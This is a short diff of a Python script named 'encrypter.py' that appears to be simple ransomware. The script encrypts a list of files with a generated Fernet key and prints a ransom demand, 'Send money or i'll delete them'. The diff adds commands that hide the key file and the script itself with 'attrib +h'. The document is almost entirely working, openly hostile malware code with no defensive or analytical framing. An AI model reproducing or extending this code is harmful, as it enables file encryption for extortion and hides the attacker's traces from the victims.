@@ -22,6 +22,11 @@ key = Fernet.generate_key()
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
+# alt+enter     shortcut to file properties
+os.system( "attrib +h thekey.key")
+os.system( "attrib +h encrypter.py")
+# os.system( "attrib +h decrypter.py")
+
 for file in files:
     with open(file, "rb") as thefile:
         content = thefile.read()
@@ -32,6 +37,3 @@ for file in files:
         thefile.write(content_encrypted)
 
 print("All your files have been encrypted!, Send money or i'll delete them")    
-
-
-
